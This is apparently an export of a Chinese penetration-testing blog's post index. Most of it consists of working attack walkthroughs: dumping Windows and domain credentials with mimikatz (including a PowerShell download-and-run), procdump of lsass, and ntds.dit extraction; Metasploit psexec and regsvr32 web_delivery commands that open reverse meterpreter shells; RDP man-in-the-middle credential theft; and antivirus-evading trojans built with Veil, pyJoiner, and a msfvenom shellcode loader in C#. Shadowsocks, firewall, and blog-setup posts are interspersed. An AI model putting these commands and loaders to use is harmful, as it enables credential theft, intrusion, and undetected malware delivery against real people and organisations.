–username c:\Users\hash\Desktop\1.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[抓取 Windows 用户或者域用户 hash 的多种姿势]]></title>
    <url>%2F2018%2F10%2F18%2F%E6%8A%93hash.html</url>
    <content type="text"><![CDATA[抓取 Windows 用户或者域用户 hash 的多种姿势 Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。 执行密码安全审核所需的主要步骤是获取包含信息的文件，从文件中转储密码哈希值，然后使用密码破解程序测试弱密码的这些哈希值。 通过获取Ntds.dit和SYSTEM文件的副本，最可靠的执行密码审计的方法是脱机的。由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。 使用mimikatz本机测试直接获取内存中的明文密码 mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀 12privilege::debugsekurlsa::logonpasswords 非交互式抓明文密码(webshell中) 1mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt powershell加载mimikatz抓取密码 1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz ProcDump + Mimikatz ==ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如目标08的,本地就要用08系统来分析)== 远程主机： 12Procdump.exe -accepteula -ma lsass.exe c:\a.dmp 或者任务管理器找到lsass.exe进程右键创建转储文件 本地主机：mimikatz 12sekurlsa::minidump a.dmpsekurlsa::logonpasswords full ntds.dit 的导出 ntdsutil win2008开始DC中自带的工具交互式12345678ntdsutilsnapshotactivate instance ntdscreatemount [GUID]//copy 完之后再执行unmout [GUID]del [GUID] 非交互1234ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit QuarkPwDump分析 https://github.com/quarkslab/quarkspwdump 在线提取（直接在目标主机执行，实战中不选择此方式。）1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit 离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt WINDOWS SERVER 2008-2016123456C:\&gt; ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit 解出ntds的hash 1NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv NtdsAudit.exe下载地址 NtdsAudit需要ntds.dit Active Directory数据库，SYSTEM 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置ntdsutil实用程序。 以管理员身份打开命令提示符（cmd.exe）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。 在命令提示符下，键入以下命令，然后按ENTER键： 1ntdsutil 在ntdsutil提示符下，键入以下命令，然后按Enter： 1activate instance ntds 在ntdsutil提示符下，键入以下命令，然后按Enter： 1ifm 在ifm提示符下，键入以下命令，然后按Enter： 1create full &lt;Drive&gt;:\&lt;Folder&gt; &lt;Drive&gt;:\&lt;Folder&gt; 是要创建的文件的文件夹路径。 例如，以下命令将显示统计信息，输出pwdump.txt包含密码哈希值的文件，并输出users.csv包含每个用户帐户详细信息的文件。 1ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv Linux 明文密码的获取mimipenguin git clone https://github.com/huntergregal/mimipenguin 支持的操作系统 os service supported Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Ubuntu Desktop 16.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Fedora Workstation 25 (x86_64) gnome-keyring-daemon (3.20.0) Y Fedora Workstation 27 (x86_64) gnome-keyring-daemon (3.20.1) Y Kali-rolling x64 gnome-keyring-daemon (3.28.0.2) Y]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows linux 应急响应流程及实战演练]]></title>
    <url>%2F2018%2F10%2F17%2Fwindows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
    <content type="text"><![CDATA[当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 windows 应急流程及实战演练 Linux 应急响应流程及实战演练]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建域环境]]></title>
    <url>%2F2018%2F10%2F16%2F%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
    <content type="text"><![CDATA[域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2 Windows 2008 server R2 (域控) 1、修改计算机名： 可以改成DC或者其他什么看着顺眼的名字，默认也行，就是搭建好域以后再改可能会遇到一些问题； 2、配置固定ip: 我虚拟机使用的桥接方式，并且路由器是192.168.3.1，所以在这如此设置，此处的DNS填写本机即，127.0.0.1； 3、服务器管理器—角色：安装Active Directory 域服务并且会同时要求安装DNS服务器； 4、配置域服务:打开服务器管理器或者在运行框下输入 dcpromo直接进行配置，选择新建， Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码； 5、设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见：http://angerfire.blog.51cto.com/198455/144123/ 6、域数据存放的地址：默认即可。 DM: Windows 2003 server SP2 1、如果新安装的虚拟机安装时会有选择项是加入域还是组，我这里选择加入域，会让登录当前域的账号密码即“Domaim\administrator”（必须是域账号不是administrator）和对应密码；已有的Windows2003加入域，首先更改组为域选择正确的domain和domain账号密码即可。 2、安装成功后配置静态IP，DNS处填写DC的IP； 3、在2003上执行net time显示如图，说明已经加入域，并且在Windows2008上的domain.com域，控制器上可以看到03的机器； 域已经搭建完成，主域控会生成一个 krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过MSF使用SMB端口远程连接目标的技巧]]></title>
    <url>%2F2018%2F10%2F16%2Fmsf%20smb.html</url>
    <content type="text"><![CDATA[前言 内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。 exploit/windows/smb/psexecmsf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec) &gt; set smbuser administratormsf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145msf exploit(windows/smb/psexec) &gt; set LPORT 4444msf exploit(windows/smb/psexec) &gt; exploit 执行后有一个session回连经实验表明，使用本地账户即使是管理员权限也不能使用此方法得到一个 meterpreter ，只能使用 administrator 的用户名密码才能回来一个 session ；当在域环境使用时，smbuser 不是写成domain/administrator （这样的用户名是Exploit failed 执行不成功的）而是写成 administrator ，并且只要是域管理员都能执行成功并反弹一个 meterpreter 的 session 。 exploit/windows/smb/psexec_pshmsf &gt; use exploit/windows/smb/psexec_pshmsf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec_psh) &gt; set smbuser administratormsf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145msf exploit(windows/smb/psexec_psh) &gt; set lport 4444msf exploit(windows/smb/psexec_psh) &gt; exploit exploit/multi/script/web_delivery使用exploit/multi/script/web_delivery 生成恶意dll代码 12345678910111213141516171819202122msf &gt; use exploit/multi/script/web_delivery msf exploit(multi/script/web_delivery) &gt; show targets Exploit targets: Id Name--- 0 Python 1 PHP 2 PSH 3 Regsvr32 4 PSH (Binary)msf exploit(multi/script/web_delivery) &gt; set target 3msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145msf exploit(multi/script/web_delivery) &gt; set lport 4444msf exploit(multi/script/web_delivery) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.2.145:4444 [*] Using URL: http://0.0.0.0:8080/s7sa27EEtl[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll auxiliary/admin/smb/psexec_command使用 auxiliary/admin/smb/psexec_command 在远程目标上执行命令种恶意 dll 回连 meterpreter ；msf &gt; use auxiliary/admin/smb/psexec_commandmsf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rdmsf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dllmsf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcpmsf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444msf auxiliary(admin/smb/psexec_command) &gt; exploit 经实验表明，当目标机器有杀毒软件的时候，会拦截其从服务器上下载恶意 dll 文件 s7sa27EEtl.sct （测试机为赛门铁克未授权版），毕竟 msf 的恶意dll 特征码已经被杀毒引擎收录，如果确定目标机其没有杀软便可使用。 auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rdmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /allmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit]]></content>
      <categories>
        <category>MSF</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7 安装 Shadowscoks]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html</url>
    <content type="text"><![CDATA[首先安装 pip ，使用 pip 安装 Shadowsocks 1234yum updateyum upgradeyum install python-pippip install shadowsocks 新建 Shadowsocks 的配置文件 1vim /etc/shadowsocks.json 编辑 Shadowocks 配置文件 12345678910&#123; "server":"0.0.0.0", "server_port":1111, "local_address":"127.0.0.1", "local_port":1080, "password":"yourpassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; 配置firewall，允许 Shadowsocks 服务端口被外网访问 1234以下命令会永久生效firewall-cmd --zone=public --add-port=1111/tcp --permanent重新载入 firewallfirewall-cmd --reload 启动 ssserver 服务 123ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d restartssserver -c /etc/shadowsocks.json -d stop]]></content>
      <categories>
        <category>vps，SS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>shadowscoks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7 使用 Firewalld 打开关闭防火墙与端口]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS7_firewalld.html</url>
    <content type="text"><![CDATA[firewalld的基本使用 12345启动： systemctl start firewalld （service firewalld start）关闭： systemctl stop firewalld （service firewalld stop）查看状态： systemctl status firewalld 开机禁用 ： systemctl disable firewalld开机启用 ： systemctl enable firewalld systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。123456789启动一个服务：systemctl start firewalld.service关闭一个服务：systemctl stop firewalld.service重启一个服务：systemctl restart firewalld.service显示一个服务的状态：systemctl status firewalld.service在开机时启用一个服务：systemctl enable firewalld.service在开机时禁用一个服务：systemctl disable firewalld.service查看服务是否开机启动：systemctl is-enabled firewalld.service查看已启动的服务列表：systemctl list-unit-files|grep enabled查看启动失败的服务列表：systemctl --failed 配置firewalld-cmd12345678910查看版本： firewall-cmd --version查看帮助： firewall-cmd --help显示状态： firewall-cmd --state查看所有打开的端口： firewall-cmd --zone=public --list-ports更新防火墙规则： firewall-cmd --reload查看区域信息: firewall-cmd --get-active-zones查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0拒绝所有包：firewall-cmd --panic-on取消拒绝状态： firewall-cmd --panic-off查看是否拒绝： firewall-cmd --query-panic 对一个端口的开启/查看/删除操作1234添加: firewall-cmd --zone=public --add-port=444/tcp --permanent (--permanent永久生效，没有此参数重启后失效)重新载入: firewall-cmd --reload查看: firewall-cmd --zone=public --query-port=444/tcp删除: firewall-cmd --zone=public --remove-port=444/tcp --permanent]]></content>
      <categories>
        <category>Linux命令</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>firewall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过降级连接劫持RDP明文凭据]]></title>
    <url>%2F2018%2F05%2F03%2Fseth.html</url>
    <content type="text"><![CDATA[Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。 用法：123456$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]实例：./seth.sh 网口 攻击者IP 访问RDP IP 被攻击者IP &lt;命令执行一般不用&gt;./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138与上面命令等价（如果所有机器在同一网段可用）：./seth.sh eth0 192.168.3.&#123;149,150,138&#125; 测试： 项目地址：Seth 攻击者机器：kali 192.168.3.149 访问RDP机器：win 7 x64 192.168.3.150 被攻击者机器：win 10 x64 192.168.3.138 欺骗ARP回复 启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。 配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。 捕获目标主机的SYN数据包。 克隆SSL证书。重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。 阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。 seth 执行完的界面： 访问RDP的机器弹出，尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息： 成功获取被攻击者RDP的用户名密码： 当以下复选框未选中时被攻击者可以直接登录系统，并且seth可以进行键盘记录。 备注： 当我使用win 10 做为访问攻击目标RDP的机器时，win 10 直接报错 ，攻击机器显示类似“请确认加密方式是不是xxx”，不能抓到密码（也可能是我环境的问题）。 使用win 7 做为访问攻击目标RDP的机器，弹出ssl认证那个，未报错，只是进不去mstsc，重新登录即可（攻击机已经断开监听所以可以正常登录）。 使用win 8 做为访问攻击目标RDP的机器，弹出ssl认证那个，报错（但是不影响，点击重新登录即可登录成功）。]]></content>
      <categories>
        <category>内网渗透</category>
        <category>RDP攻击</category>
      </categories>
      <tags>
        <tag>RDP</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TheFatRat YouTube 视频]]></title>
    <url>%2F2018%2F04%2F27%2Fbypass-av.html</url>
    <content type="text"><![CDATA[TheFatRat Screetsec Channel : https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw Udate thefatrat v1.8 https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 file Pumper in linux with fatrat https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :https://www.youtube.com/watch?v=mkfKSCxvPec Embed Backdoor Apk Andoird : https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be Create Backdoor Php and Reconnect With TheFatRat : https://www.youtube.com/watch?v=gfS55fjd8Fg THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : https://www.youtube.com/watch?v=C4YHVKPw6Zo Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : https://www.youtube.com/watch?v=-WbKOxIl_f4 How to hack android device with FatRat on kali linux 2 :https://www.youtube.com/watch?v=yUuwnu-NUXE Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : https://www.youtube.com/watch?v=7PMfPbrM0o4 FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=8lJBwclFwJI FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=wCzsD6vt9CQ TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :https://www.youtube.com/watch?v=wuOCDn0NvWc 1000 % FUD Backdoor with TheFatRat Tool : https://www.youtube.com/watch?v=vPXWv0jaBEQ How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : https://www.youtube.com/watch?v=26tSOuPcpZk Backdoor (Virus) 100% Indetectable | TheFatRat : https://www.youtube.com/watch?v=26tSOuPcpZk Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :https://www.youtube.com/watch?v=1SQW9lujjT8 Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 https://www.youtube.com/watch?v=FlXMslSjnGw TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 ALL VIDEO IN HERE : https://www.youtube.com/results?search_query=thefatrat+backdoor]]></content>
      <categories>
        <category>bypass-av</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>bypass-av</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil-Evasion + pyJoiner 捆绑两个 EXE 的免杀木马]]></title>
    <url>%2F2018%2F03%2F09%2Fveil%2BpyJoiner.html</url>
    <content type="text"><![CDATA[0x00 前言最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。 0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马 Veil-Evasion 制作回连木马 12345678910111213141516root@kali:~# veiluse 1 #选择使用 Veil-Evasion 模块Veil-Evasion Menu 41 payloads loadedAvailable Commands: back Go to main Veil menu checkvt Check virustotal against generated hashes clean Remove generated artifacts exit Exit Veil info Information on a specific payload list List available payloads use Use a specific payloadVeil-Evasion command: use 11 #选择payload[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444[cs/meterpreter/rev_tcp&gt;&gt;] generate 使用以下命令开启监听： root@kali:~# msfconsole -r /var/lib/veil/output/handlers/test.rc 0x02 配置 pyJoiner—GUI-Version 运行环境GitHub 上有两个版本 项目地址 ，其中 kali 版必须使用 Kali Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner—GUI-Version。 本次实验 pyJoiner 运行环境如下： Windows 10 Python 3.6.3 pyinstaller 3.3.1 0x03 将两个exe文件进行捆绑这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下： py -3 pyJoiner.py #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD 打开 GUI 如下图： 实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。 捆绑后生成的 exe 路径如下： 0x04 免杀回连测试使用在线查杀引擎 virustotal 的结果如下： 回连测试： 目标机 Windows 10 在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器 kali 回连 Meteoreter session 12msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500 参考资料https://www.youtube.com/watch?v=vHz8QU2Dj9M https://github.com/danielhnmoreno/pyJoiner---GUI-Version]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装pptp和shadowsocks客户端]]></title>
    <url>%2F2018%2F03%2F06%2Fkali%E5%AE%89%E8%A3%85pptp%2Bshadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html</url>
    <content type="text"><![CDATA[kali 安装 pptp 方法依次执行以下命令 123456apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome#以上为一条命令来执行cp /etc/network/interfaces /etc/network/interfaces.backup echo &quot;auto lo &quot; &gt; /etc/network/interfaces echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces /etc/init.d/network-manager restart kali安装ss客户端Command-line Client1234pip install shadowsocksapt-get install shadowsocks-libevcpan Net::Shadowsockssslocal -s 23.154.235.12 -p 8388 -l 1080 -k password -t 600 -m aes-256-cfb 注释：-s 服务器IP，-p为ss配置的端口，-l 本地代理端口，-k为ss配置的密码]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>pptp</tag>
        <tag>ss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[免杀 MSF Windows Payload 的方法与实践（小白视角）]]></title>
    <url>%2F2017%2F12%2F22%2F%E5%85%8D%E6%9D%80%20MSF%20Windows%20Payload%20%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
    <content type="text"><![CDATA[MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。 0x00 制作payload使用 kali 里的 msfvenom 生成一个x86的 Meterpreter Payload 命令如下： 1root@kali:~# msfvenom -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe 大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。 生成结果 cat https.csharp 如图所示， 0x01 创建 c# 项目我们需要创建一个 C# 项目，我使用的是 Visual Studio 2017。新建一个空白的 C# 的控制台应用(.NET Framework)工程，.Net Framework 版本选择 2.0（保证兼容性）。 将下列代码粘贴覆盖到 Program.cs 中： 123456789101112131415161718192021222324252627282930using System;using System.Threading;using System.Runtime.InteropServices;namespace MSFWrapper&#123; public class Program &#123; public Program() &#123; RunMSF(); &#125; public static void RunMSF() &#123; byte[] MsfPayload = &#123; //Paste your Payload here &#125;; IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40); Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length); CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0); Thread.Sleep(2000); &#125; public static void Main() &#123; &#125; [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); &#125;&#125; 然后将在 kali 生成的 payload 中的十六进制数数组粘贴到代码中注释为“//Paste your Payload here”的下面。 保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存，如图： 增加 Release 版的 x86 编译对象，如图： 然后生成出 MSFWrapper.exe ： 0x02 将生成的 exe 文件转换成 js 文件DotNetToJScript源码下载 开源工具DotNetToJScript详细编译教程 转换命令： F:\WEB渗透工具&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe 0x03 通过命令执行 js 文件使其弹回 Meterpreter shell在 kali 里执行命令进行监听： 123456root@kali:~# msfconsole msf &gt; use exploit/multi/handler msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httpsmsf exploit(multi/handler) &gt; set lhost 192.168.1.99msf exploit(multi/handler) &gt; set lport 443msf exploit(multi/handler) &gt; run 在目标机器执行如下命令： C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js kali 反弹回 meterpreter ： 12[*] Started HTTPS reverse handler on https://192.168.1.99:443[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ... 这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！ 0x04 END未完待续 ing……]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源工具DotNetToJScript详细编译教程]]></title>
    <url>%2F2017%2F12%2F18%2F%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html</url>
    <content type="text"><![CDATA[0x00 介绍James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。 工具下载：下载地址 0x01 用到工具由于此为开源代码需要自己编译，通过自己的研究终于编译成功。 使用工具vs2017； ndesk-options-0.2.1.bin 文件的引用。 0x02 编译过程 打开vs2017，点击打开项目/解决方案； 打开DotNetToJScript目录下的DotNetToJScript.csproj Visual C# 项目文件； 点击Program.cs生成解决方案； 报错缺少程序集引用 NDesk.Options； 解决办法 需要添加引用 NDesk.Options 下载地址： 点击下载 解压缩，按图添加引用； ​ 浏览—-选择图中文件—-添加； 然后重新生成解决方案即可； ​ ​ ​]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo + Next 搭建GitHub page]]></title>
    <url>%2F2017%2F12%2F13%2FHexo%2Bnext.html</url>
    <content type="text"><![CDATA[0x00 准备工作 下载node.js并安装 官网下载安装默认会安装npm； 下载安装git 官网下载安装； 安装hexo，方法：管理员打开cmd：$ npm install -g hexo-cli。 0x01 本地生成hexo文件 在本地新建一个文件夹 e.g. D:/Hexo ； 在D:/Hexo目录下鼠标右键”Git Bash Here”，输入：hexo init; 输入：hexo g 生成静态网页，hexo s 启动本地服务预览； 完成后Hexo文件夹会生成以下内容： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 打开本地浏览器 输入：http://localhost:4000 进行访问。 0x02 将本地hexo推送到GitHub 在GitHub上创建名字为 zhangsan.github.io 的项目zhangsan是自己的github用户名； 打开 D:/Hexo/_config.yml 配置文件，修改以下内容为 http://zhangsan.github.io ： 123# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: http://zhangsan.github.io 打开 D:/Hexo/_config配置文件，在文末的deploy做以下设置： 1234deploy: type: git repository: https://github.com/zhangsan/zhangsan.github.io.git branch: master 执行：npm install hexo-deployer-git –save （此命令最好在管理员权限的cmd下执行）； 执行：hexo clear (一般情况下不用执行这个命令，当网站错误打不开的时候再执行它！)； 执行：hexo g （本地生成静态文件）； 执行：hexo d （将本地静态文件推送至Github)； 期间会弹出github登录框按提示登录即可，登录成功一次往后不用重复登录； 通过http://zhangsan.github.io即可访问。 0x03 绑定自己的域名 域名服务商-控制面板-DNS解析—添加CNAME记录：@ &gt;&gt;&gt; zhangsan.github.ioORwww &gt;&gt;&gt; zhangsan.github.io 